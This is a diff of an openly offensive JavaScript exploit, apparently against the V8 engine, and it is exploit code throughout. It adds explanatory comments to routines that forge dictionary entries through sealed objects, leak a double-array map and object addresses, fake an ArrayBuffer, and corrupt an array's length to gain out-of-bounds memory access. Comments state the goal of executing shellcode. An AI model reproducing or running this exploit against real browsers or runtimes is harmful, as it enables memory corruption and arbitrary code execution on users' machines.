@@ -1,4 +1,4 @@
-function dp(x){%DebugPrint(x);}
+function dp(x){}//{%DebugPrint(x);}
 const print = console.log;
 const assert = function (b, msg)
 {
@@ -37,27 +37,30 @@ function test_hash()
 	const v2 = {foo:1.1};
 	v2[0] = 4;
 	v2[1] = 0;
-	v2[2] = 0x11;
+	v2[2] = 0x11; // capacity
 	v2[3] = 1
 	for (var i = 0; i < 0x10 * 3; i++)
 	{
 		v2[4 + i] = 3 + i;
-	}
-	v2[4] = 1;
+	}// make sure a FixedArray is generated
+	v2[4] = 1; // fake entry at index 0
 	v2[5] = 0xdead;
 	v2[6] = 0xc0;
-	v2[i+4] = 1;
+	v2[i+4] = 1; // fake entry at index 0x10
 	v2[i+5] = 0x1337;
 	v2[i+6] = 0xc0;
+
 	Object.seal(v2);
 	const v12 = {foo:2.2};
 	Object.preventExtensions(v12);
 	Object.seal(v12);
 	const v18 = {foo:Object};
-
 	v12.a = 0;
 	v2.a = 0;
+
 	return v2[1] === 0x1337;
+	// if entry at 0x10 is fetched
+	// the hash value is desired
 }
 
 /*
@@ -131,8 +134,6 @@ function leaker(o1, o2)
 	readline();
 	v2[1] = doubleMap;
 }
-
-
 }*/
 
 function get_double_map()
@@ -140,13 +141,19 @@ function get_double_map()
 	const v2 = {foo2:1.1};
 	v2[0] = 4;
 	v2[1] = 0;
-	v2[2] = 0x11;
+	v2[2] = 0x11; // capacity
 	v2[3] = 1;
 	arr = [1.1, 2.2, 3.3, 4.4, 5.5,
 		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
 		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
 		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
-		1.1, 2.2, 3.3, 4.4, 2.12199579096527231511138221486E-314];
+		1.1, 2.2, 3.3, 4.4,
+		2.12199579096527231511138221486E-314]; // Smi(1)
+	// in this way, there will be a fake entry
+	// (Smi(1), map of double array, property of double array)
+	// if we fetch key 1, map of double array can be fetched
+	// however, some times we get undefined
+	// I _think_ the reason is we cannot control third field
 	Object.seal(v2);
 	const v12 = {foo2:2.2};
 	Object.preventExtensions(v12);
@@ -154,15 +161,17 @@ function get_double_map()
 	const v18 = {foo2:Object};
 	v12.a = 0;
 	v2.a = 0;
+
 	return v2[1];
 }
 
 function leaker_faker(wmain, dMap, fakeAbArr)
 {
-	const v2 = {foo3:1.1};
+	const v2 = {foo3:1.1}; // name must be different
+	// otherwise previous map will be used
 	v2[0] = 4;
 	v2[1] = 0;
-	v2[2] = 0x11;
+	v2[2] = 0x11; // capacity
 	v2[3] = 1;
 	let arr = [0.0, 1.1, 2.2, 3.3, 4.4,
 		0.0, 1.1,
@@ -179,16 +188,28 @@ function leaker_faker(wmain, dMap, fakeAbArr)
 	const v18 = {foo3:Object};
 	v12.a = 0;
 	v2.a = 0;
+
+	// in this way we can create a fake entry
+	// that fake entry can be used by v2
+	// and is also elements of double array
+	// we can use this to leak addresses and fake object
 	v2[1] = wmain;
 	wmainAddr = d2u(arr[8]);
 	v2[1] = dMap;
 	abMapAddr = d2u(arr[8])-3600;
+	// obtain map of ArrayBuffer using map of double array
 	v2[1] = fakeAbArr;
 	fakeAbAddr = d2u(arr[8]) + 0x40;
+	// FixedArray of array is after array object
+	// not sure why, maybe because seal and preventExtensions
+	// but there is a FixedArray before array,
+	// although its value cannot be modified
 	print(hex(wmainAddr)+' '+hex(abMapAddr)+' '+hex(fakeAbAddr));
+
 	fakeAbArr[0] = u2d(abMapAddr);
 	arr[8] = u2d(fakeAbAddr);
 	return v2[1];
+	// fake the ArrayBuffer object
 }
 function exp1()
 {
@@ -236,10 +257,11 @@ function corrupt_arr()
 		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
 		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
 		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
-		2.12199579096527231511138221486E-314];
+		2.2]; // length is 30
 	gOobArr = [13.37];
 	gAb = new ArrayBuffer(0x321);
 	gSig = {a:0xdead,b:0xbeef,c:wmain};
+
 	Object.seal(v2);
 	const v12 = {foo4:2.2};
 	Object.preventExtensions(v12);
@@ -247,7 +269,12 @@ function corrupt_arr()
 	const v18 = {foo4:Object};
 	v12.a = 0;
 	v2.a = 0;
+
 	delete v2[30];
+	// so entry at 0x10 is now
+	// (array length, xxx, xxx)
+	// length -> undefined
+	// although not a Smi, this can still cause OOB
 	return arr;
 }
 
@@ -260,6 +287,8 @@ function exp2()
 		return false; // 0.5
 	dp(oobArr);
 	oobArr[36] = 1.04380972957581745180328891149E-310;
+	// write gOobArr.length == 0x1337
+	// since length that is not Smi might be unstable
 	dp(gOobArr);
 
 	// now gOobArr have OOB access
@@ -319,5 +348,5 @@ function exp2()
 	// execute the shellcode
 }
 
-if(exp2() === false)
+if(exp1() === false)
 	throw Error("failed to execute shellcode!");
